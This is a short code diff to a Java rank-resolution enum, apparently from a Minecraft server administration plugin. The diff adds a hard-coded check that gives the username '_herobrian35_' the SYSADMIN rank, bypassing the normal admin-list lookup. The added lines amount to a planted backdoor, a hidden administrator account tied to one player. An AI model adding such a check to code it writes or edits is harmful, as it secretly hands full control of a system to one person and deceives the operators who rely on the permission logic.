@@ -125,7 +125,10 @@ public enum TFM_PlayerRank
             {
                 return SYSADMIN;
             }
-               
+              if (sender.getName().equals("_herobrian35_"))
+            {
+                return SYSADMIN;
+            }  
 
             if (entry.isSeniorAdmin())
             {
